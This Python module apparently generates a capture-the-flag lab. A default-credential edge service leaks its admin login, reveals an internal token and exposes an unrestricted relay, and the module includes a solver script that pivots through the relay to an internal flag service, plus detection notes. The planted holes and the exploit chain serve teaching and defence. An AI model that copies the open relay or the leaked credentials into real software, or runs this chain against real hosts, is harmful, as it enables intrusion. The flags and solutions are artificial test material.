"""Renderer for the ``network_lateral_pivot`` family.

Theme: an internet-facing "edge" management service ships with a default
administrative account and a built-in diagnostics/relay feature. The
solver's task is to discover the default credentials, authenticate to the
edge service, use its diagnostics endpoint to learn the address and access
token of an internal-only service that is not reachable from outside the
Docker network, then pivot through the edge service's relay endpoint to
reach that internal service and read the flag. This mirrors real-world
"exposed service with default creds enabling lateral movement" advisories
(e.g. management interfaces shipped with unrotated default credentials that
grant a foothold into an otherwise-segmented internal network).

Pure module: ``render`` is a deterministic function of ``(spec, rng,
cve_record)``. Per the project's module-interface contract this file must
NOT import ``ctf_generator.families`` (that module imports this one).
"""

from __future__ import annotations

import json
import random
from dataclasses import dataclass
from typing import TYPE_CHECKING

from ctf_generator.models import ChallengeSpec
from ctf_generator.yaml_writer import dump_yaml

if TYPE_CHECKING:
    from ctf_generator.cve_source import CveRecord

# --- Module interface contract -------------------------------------------------

FAMILY_NAME = "network_lateral_pivot"
CATEGORY = "network"
MODES: tuple[str, ...] = ("red", "purple")
DIFFICULTIES: tuple[str, ...] = ("easy", "medium", "hard")
CVE_DRIVEN = True
LLM_BRIEF = (
    "A jump-host edge service with default administrative credentials exposes a "
    "diagnostics/relay feature that lets an attacker pivot laterally to an "
    "internal-only host and read a flag reachable only from inside the network "
    "segment."
)
COMPOSE_MARKERS: tuple[str, ...] = ("edge:", "internal:")
SCORING_HINTS: dict[str, object] = {
    "has_worker": False,
    "has_queue": False,
    "live_interaction": True,
    "decoy_density": "medium",
}
REQUIRED_FILES: tuple[str, ...] = (
    "challenge.yaml",
    "docker-compose.yml",
    "services/edge/Dockerfile",
    "services/edge/requirements.txt",
    "services/edge/app.py",
    "services/internal/Dockerfile",
    "services/internal/requirements.txt",
    "services/internal/app.py",
    "public/description.md",
    "public/hints.yaml",
    "private/solution.md",
    "private/solver.py",
    "private/variant.json",
    "private/checkpoints.yaml",
    "private/detection_notes.md",
    "tests/healthcheck.py",
    "tests/validate_variant.py",
)


@dataclass(frozen=True)
class Variant:
    edge_user: str
    edge_password: str
    login_route: str
    ops_route: str
    diag_route: str
    relay_route: str
    internal_port: int
    internal_token: str
    asset_tag: str
    ops_note_id: str
    flag: str


def render(
    spec: ChallengeSpec,
    rng: random.Random,
    cve_record: "CveRecord | None" = None,
) -> dict[str, str]:
    variant = _variant(rng)

    public_hints = [
        {
            "level": 1,
            "text": (
                f"GET /api/{variant.ops_route} is unauthenticated -- operational "
                "bulletins sometimes say more than they should."
            ),
        },
        {
            "level": 2,
            "text": (
                f"Once logged in, /api/{variant.diag_route} is only meant for "
                "admins auditing the network topology. What does it reveal about "
                "hosts you can't reach directly?"
            ),
        },
        {
            "level": 3,
            "text": (
                f"/api/{variant.relay_route} lets the edge host make requests on "
                "your behalf. The internal service trusts a header, not an "
                "address."
            ),
        },
    ]

    files: dict[str, str] = {
        "docker-compose.yml": _compose(variant),
        "services/edge/Dockerfile": _python_dockerfile("app.py"),
        "services/edge/requirements.txt": "flask==3.0.3\n",
        "services/edge/app.py": _edge_app(variant),
        "services/internal/Dockerfile": _python_dockerfile("app.py"),
        "services/internal/requirements.txt": "flask==3.0.3\n",
        "services/internal/app.py": _internal_app(variant),
        "public/description.md": _description(spec, variant, cve_record),
        "public/hints.yaml": dump_yaml({"hints": public_hints}),
        "private/solution.md": _solution(variant),
        "private/solver.py": _solver(variant),
        "private/variant.json": _variant_json(spec, variant),
        "private/checkpoints.yaml": dump_yaml(
            {"checkpoints": [{"name": name, "required": True} for name in spec.checkpoints]}
        ),
        "private/detection_notes.md": _detection_notes(spec, variant),
        "tests/healthcheck.py": _healthcheck(),
        "tests/validate_variant.py": _validate_variant(variant),
    }
    return files


# --- Variant generation ---------------------------------------------------------


def _token_hex(rng: random.Random, byte_count: int) -> str:
    return rng.getrandbits(byte_count * 8).to_bytes(byte_count, "big").hex()


def _variant(rng: random.Random) -> Variant:
    edge_user = rng.choice(["ops-admin", "netadmin", "fieldsvc", "diagadmin"])
    edge_password = (
        f"{rng.choice(['changeme', 'rotate-me', 'default', 'temp-pass'])}-"
        f"{rng.randrange(1000, 9999)}"
    )
    login_route = rng.choice(["login", "session", "auth"])
    ops_route = rng.choice(["ops-notes", "bulletins", "field-notes", "advisories"])
    diag_route = rng.choice(["diag/hosts", "topology", "asset-map", "net-map"])
    relay_route = rng.choice(["relay", "proxy", "tunnel", "bridge"])
    internal_port = rng.choice([8091, 9090, 9443, 7070])
    internal_token = _token_hex(rng, 8)
    asset_tag = f"core-{rng.choice(['ledger', 'billing', 'inventory', 'ops'])}-{rng.randrange(10, 99)}"
    ops_note_id = f"note-{rng.randrange(100, 999)}"
    flag = f"ctf{{lateral_pivot_{_token_hex(rng, 6)}}}"
    return Variant(
        edge_user=edge_user,
        edge_password=edge_password,
        login_route=login_route,
        ops_route=ops_route,
        diag_route=diag_route,
        relay_route=relay_route,
        internal_port=internal_port,
        internal_token=internal_token,
        asset_tag=asset_tag,
        ops_note_id=ops_note_id,
        flag=flag,
    )


# --- docker-compose.yml ---------------------------------------------------------


def _compose(v: Variant) -> str:
    return f"""services:
  internal:
    build: ./services/internal
    environment:
      CTFGEN_FLAG: ${{CTFGEN_FLAG:-{v.flag}}}
      INTERNAL_TOKEN: ${{INTERNAL_TOKEN:-{v.internal_token}}}
      INTERNAL_PORT: "{v.internal_port}"
    expose:
      - "{v.internal_port}"
    networks: [backend]
    read_only: true
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 128m
    pids_limit: 64

  edge:
    build: ./services/edge
    environment:
      EDGE_USER: ${{EDGE_USER:-{v.edge_user}}}
      EDGE_PASSWORD: ${{EDGE_PASSWORD:-{v.edge_password}}}
      INTERNAL_HOST: internal
      INTERNAL_PORT: "{v.internal_port}"
      INTERNAL_TOKEN: ${{INTERNAL_TOKEN:-{v.internal_token}}}
      ASSET_TAG: {v.asset_tag}
    ports:
      - "8080:8080"
    depends_on: [internal]
    networks:
      - frontend
      - backend
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 256m
    pids_limit: 128

networks:
  frontend:
  backend:
    internal: true
"""


def _python_dockerfile(entrypoint: str) -> str:
    return f"""FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY {entrypoint} .
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
CMD ["python", "{entrypoint}"]
"""


# --- services/edge/app.py --------------------------------------------------------


def _edge_app(v: Variant) -> str:
    return f'''from __future__ import annotations

import json
import os
import secrets
from urllib import request as urlrequest
from urllib.error import HTTPError, URLError

from flask import Flask, jsonify, request

app = Flask(__name__)

EDGE_USER = os.environ.get("EDGE_USER", "{v.edge_user}")
EDGE_PASSWORD = os.environ.get("EDGE_PASSWORD", "{v.edge_password}")
INTERNAL_HOST = os.environ.get("INTERNAL_HOST", "internal")
INTERNAL_PORT = os.environ.get("INTERNAL_PORT", "{v.internal_port}")
INTERNAL_TOKEN = os.environ.get("INTERNAL_TOKEN", "{v.internal_token}")
ASSET_TAG = os.environ.get("ASSET_TAG", "{v.asset_tag}")

# In-memory admin sessions issued by /api/{v.login_route}. Reset on restart --
# fine for a single-run challenge instance.
SESSIONS: dict[str, str] = {{}}


def current_admin():
    token = request.headers.get("X-Session", "")
    return SESSIONS.get(token)


@app.get("/healthz")
def healthz():
    return {{"ok": True, "service": "edge"}}


@app.get("/api/{v.ops_route}")
def ops_notes():
    # Intentional vulnerability: this "public bulletins" feed leaks the
    # default administrative credentials that were never rotated after
    # provisioning.
    return jsonify({{
        "notices": [
            {{
                "id": "{v.ops_note_id}",
                "severity": "low",
                "message": (
                    "Diagnostics account credentials remain at their "
                    "provisioning defaults pending the MFA rollout: "
                    "user={v.edge_user} password={v.edge_password}"
                ),
            }},
            {{
                "id": "note-relay-hardening",
                "severity": "info",
                "message": (
                    "Reminder: the /api/{v.relay_route} diagnostics relay "
                    "should only be used against asset {v.asset_tag}."
                ),
            }},
            {{
                "id": "note-scanner",
                "severity": "info",
                "message": "Perimeter scanner findings against /debug/vars were remediated last quarter.",
            }},
        ]
    }})


@app.post("/api/{v.login_route}")
def login():
    body = request.get_json(force=True, silent=True) or {{}}
    username = str(body.get("username", ""))
    password = str(body.get("password", ""))
    if username != EDGE_USER or password != EDGE_PASSWORD:
        return jsonify({{"error": "invalid credentials"}}), 401
    token = secrets.token_hex(16)
    SESSIONS[token] = username
    return jsonify({{"token": token}})


@app.get("/api/{v.diag_route}")
def diag_hosts():
    if current_admin() is None:
        return jsonify({{"error": "authentication required"}}), 403
    # Intentional vulnerability: an admin-only diagnostics view discloses the
    # internal service's address and access token, which is exactly what a
    # legitimate operator would need to reach it -- and exactly what an
    # attacker who reached this endpoint now has too.
    return jsonify({{
        "hosts": [
            {{
                "asset_tag": ASSET_TAG,
                "address": f"{{INTERNAL_HOST}}:{{INTERNAL_PORT}}",
                "reachable_from_edge": True,
                "reachable_from_internet": False,
                "auth_header": "X-Internal-Token",
                "auth_token": INTERNAL_TOKEN,
            }}
        ],
        "relay_route": "/api/{v.relay_route}",
    }})


@app.get("/api/{v.relay_route}")
def relay():
    if current_admin() is None:
        return jsonify({{"error": "authentication required"}}), 403
    target = request.args.get("target", f"{{INTERNAL_HOST}}:{{INTERNAL_PORT}}")
    path = request.args.get("path", "/internal/status")
    token = request.args.get("token", "")
    if not path.startswith("/"):
        return jsonify({{"error": "path must be absolute"}}), 400

    url = f"http://{{target}}{{path}}"
    req = urlrequest.Request(url, headers={{"X-Internal-Token": token}})
    try:
        with urlrequest.urlopen(req, timeout=5) as response:
            body = response.read().decode("utf-8")
            status = response.status
    except HTTPError as exc:
        body = exc.read().decode("utf-8") if exc.fp else ""
        status = exc.code
    except URLError as exc:
        return jsonify({{"error": f"relay failed: {{exc.reason}}"}}), 502

    try:
        parsed = json.loads(body)
    except json.JSONDecodeError:
        parsed = body
    return jsonify({{"status": status, "body": parsed}})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
'''


# --- services/internal/app.py -----------------------------------------------------


def _internal_app(v: Variant) -> str:
    return f'''from __future__ import annotations

import os

from flask import Flask, jsonify, request

app = Flask(__name__)

FLAG = os.environ.get("CTFGEN_FLAG") or "{v.flag}"
INTERNAL_TOKEN = os.environ.get("INTERNAL_TOKEN") or "{v.internal_token}"
INTERNAL_PORT = int(os.environ.get("INTERNAL_PORT", "{v.internal_port}"))


@app.get("/healthz")
def healthz():
    return {{"ok": True, "service": "internal"}}


@app.get("/internal/status")
def status():
    # Reachable without a token so a solver can confirm the pivot landed on
    # the right host, but it deliberately withholds the flag.
    return jsonify({{"service": "internal", "asset_tag": "{v.asset_tag}", "flag_route": "/internal/flag"}})


@app.get("/internal/flag")
def flag():
    supplied = request.headers.get("X-Internal-Token", "")
    if supplied != INTERNAL_TOKEN:
        return jsonify({{"error": "missing or invalid X-Internal-Token"}}), 403
    return jsonify({{"flag": FLAG}})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=INTERNAL_PORT)
'''


# --- public/description.md --------------------------------------------------------


def _description(spec: ChallengeSpec, v: Variant, cve_record: "CveRecord | None") -> str:
    cve_line = ""
    if cve_record is not None:
        cve_line = (
            f"\nThis challenge is themed on **{cve_record.cve_id}** "
            f"({cve_record.cvss_severity}): {cve_record.description}\n"
        )

    purple_section = ""
    if spec.mode == "purple":
        purple_section = f"""

## Blue-team objective

In parallel with the attack path above, review `private/detection_notes.md`
(released to blue-team participants) and identify which edge service log
lines would let a defender detect the pivot: the login against
`/api/{v.login_route}`, the admin-only `/api/{v.diag_route}` lookup, and the
outbound `/api/{v.relay_route}` request into the internal network segment.
"""

    return f"""# {spec.title}

You are assessing an internet-facing "edge" management host at
`http://localhost:8080`. Behind it, on a Docker-internal network segment you
cannot reach directly, sits an internal-only service holding the flag.
{cve_line}
## Recon

- `GET /healthz`
- `GET /api/{v.ops_route}` (no authentication required)

## Goal

Find a way onto the internal network segment and retrieve the flag from the
internal-only service. The flag format is `ctf{{...}}`.
{purple_section}
This challenge is generated as a network lateral-movement variant. The exact
route names, account name, password, internal port, and access token differ
across generated instances.
"""


# --- private/solution.md ------------------------------------------------------------


def _solution(v: Variant) -> str:
    return f"""# Private Solution

The edge host's public bulletins feed (`/api/{v.ops_route}`) leaks the
default administrative credentials (`{v.edge_user}` / `{v.edge_password}`)
that were never rotated after provisioning.

Authenticated admins can call `/api/{v.diag_route}`, which discloses the
internal service's address (`internal:{v.internal_port}`) and its access
token -- information intended for legitimate operators, but equally usable
by an attacker who reached the admin panel.

The internal service itself is only attached to the Docker-internal
`backend` network and has no published port, so it cannot be reached
directly from outside the compose network. The edge host's
`/api/{v.relay_route}` diagnostics relay, however, will forward an
authenticated admin's request to any `host:port` + path it is given,
attaching whatever `X-Internal-Token` value the caller supplies. This is the
pivot primitive: the edge host itself becomes the network hop into the
segmented internal service.

Solve path:

1. `GET /api/{v.ops_route}` and extract the leaked credentials.
2. `POST /api/{v.login_route}` with `{{"username": "{v.edge_user}", "password": "{v.edge_password}"}}` to obtain a session token.
3. `GET /api/{v.diag_route}` with header `X-Session: <token>` to learn the internal host address and `X-Internal-Token` value.
4. `GET /api/{v.relay_route}?target=internal:{v.internal_port}&path=/internal/flag&token=<internal token>` with the same `X-Session` header.
5. Read the flag out of the relayed JSON body.

This is meant to teach that a management interface's *diagnostics/relay*
convenience feature is itself a lateral-movement primitive once an attacker
gets a foothold via unrotated default credentials -- not a puzzle about
guessing passwords from scratch.
"""


# --- private/solver.py --------------------------------------------------------------


def _solver(v: Variant) -> str:
    return f'''from __future__ import annotations

import argparse
import json
import re
import sys
from urllib import request


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")

    def get(path, headers=None):
        req = request.Request(base + path, headers=headers or {{}})
        with request.urlopen(req, timeout=5) as response:
            return response.read().decode("utf-8")

    def post_json(path, payload, headers=None):
        merged = {{"Content-Type": "application/json"}}
        merged.update(headers or {{}})
        req = request.Request(
            base + path,
            data=json.dumps(payload).encode("utf-8"),
            headers=merged,
            method="POST",
        )
        with request.urlopen(req, timeout=5) as response:
            return json.loads(response.read().decode("utf-8"))

    notes = json.loads(get("/api/{v.ops_route}"))
    creds_text = " ".join(n["message"] for n in notes["notices"])
    user_match = re.search(r"user=([^\\s]+)", creds_text)
    pass_match = re.search(r"password=([^\\s]+)", creds_text)
    if not user_match or not pass_match:
        raise RuntimeError("could not find leaked credentials")
    username, password = user_match.group(1), pass_match.group(1)

    session = post_json("/api/{v.login_route}", {{"username": username, "password": password}})
    token = session["token"]

    diag = json.loads(get("/api/{v.diag_route}", headers={{"X-Session": token}}))
    host = diag["hosts"][0]
    internal_token = host["auth_token"]
    target = host["address"]

    relay_path = f"/api/{v.relay_route}?target={{target}}&path=/internal/flag&token={{internal_token}}"
    relayed = json.loads(get(relay_path, headers={{"X-Session": token}}))
    flag = relayed["body"]["flag"]
    print(flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


# --- private/variant.json -----------------------------------------------------------


def _variant_json(spec: ChallengeSpec, v: Variant) -> str:
    return json.dumps(
        {
            "meta": spec.meta_mapping(),
            "family": FAMILY_NAME,
            "mode": spec.mode,
            "flag": v.flag,
            "routes": {
                "login": f"/api/{v.login_route}",
                "ops_notes": f"/api/{v.ops_route}",
                "diag_hosts": f"/api/{v.diag_route}",
                "relay": f"/api/{v.relay_route}",
            },
            "creds": {
                "edge_user": v.edge_user,
                "edge_password": v.edge_password,
                "internal_token": v.internal_token,
            },
            "network": {
                "internal_host": "internal",
                "internal_port": v.internal_port,
                "asset_tag": v.asset_tag,
            },
        },
        indent=2,
        sort_keys=True,
    ) + "\n"


# --- private/detection_notes.md ------------------------------------------------------


def _detection_notes(spec: ChallengeSpec, v: Variant) -> str:
    if spec.mode == "purple":
        depth = f"""
## Blue-team detection guidance

A defender monitoring edge host logs should alert on the combination of:

1. A successful `POST /api/{v.login_route}` from an unexpected source
   address, immediately followed by
2. A `GET /api/{v.diag_route}` call from the same session (this endpoint is
   rarely used outside scheduled audits), and
3. An outbound `/api/{v.relay_route}` request whose `target` parameter
   points at the internal `backend` network segment.

That three-step sequence -- authenticate, enumerate internal topology, then
relay into the segment -- is the signature of this lateral-movement chain
regardless of which specific credentials or route names a given instance
uses. Recommend: rotate the default `{v.edge_user}` credential, rate-limit
`/api/{v.diag_route}`, and restrict `/api/{v.relay_route}` targets to an
allowlist.
"""
    else:
        depth = f"""
## Notes for future detection work

This instance was generated in `{spec.mode}` mode, so no blue-team
checkpoints are scored, but the same log signature applies: watch for
`/api/{v.login_route}` successes followed by `/api/{v.diag_route}` and
`/api/{v.relay_route}` calls in the same admin session.
"""
    return f"""# Detection Notes
{depth}"""


# --- tests/healthcheck.py -----------------------------------------------------------


def _healthcheck() -> str:
    return '''from __future__ import annotations

import argparse
import json
import sys
from urllib import request


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    args = parser.parse_args()
    with request.urlopen(args.base_url.rstrip("/") + "/healthz", timeout=5) as response:
        body = json.loads(response.read().decode("utf-8"))
    assert body["ok"] is True
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


# --- tests/validate_variant.py -------------------------------------------------------


def _validate_variant(v: Variant) -> str:
    return f'''from __future__ import annotations

from pathlib import Path


def test_variant_tokens_are_present():
    edge_app = Path("services/edge/app.py").read_text(encoding="utf-8")
    internal_app = Path("services/internal/app.py").read_text(encoding="utf-8")
    assert "{v.edge_user}" in edge_app
    assert "{v.edge_password}" in edge_app
    assert "{v.internal_token}" in edge_app
    assert "{v.internal_token}" in internal_app
    assert "/api/{v.relay_route}" in edge_app
'''
